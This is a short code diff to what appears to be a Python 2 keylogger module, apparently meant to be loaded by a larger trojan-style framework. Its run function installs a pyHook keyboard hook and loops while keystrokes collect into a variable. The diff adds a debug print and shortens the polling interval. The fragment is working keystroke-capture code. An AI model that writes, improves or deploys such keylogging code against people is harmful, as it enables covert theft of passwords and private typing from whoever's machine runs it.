@@ -72,13 +72,14 @@ def KeyStroke(event):
     # pass execution to next hook registered 
     return True
 def run(**args):
+    print "in run"
     global s
     global num
     kl         = pyHook.HookManager()
     kl.KeyDown = KeyStroke
     kl.HookKeyboard()
     while num < 100:
-        time.sleep(0.05)
+        time.sleep(0.02)
         pythoncom.PumpWaitingMessages()
     num = 1
     t = s
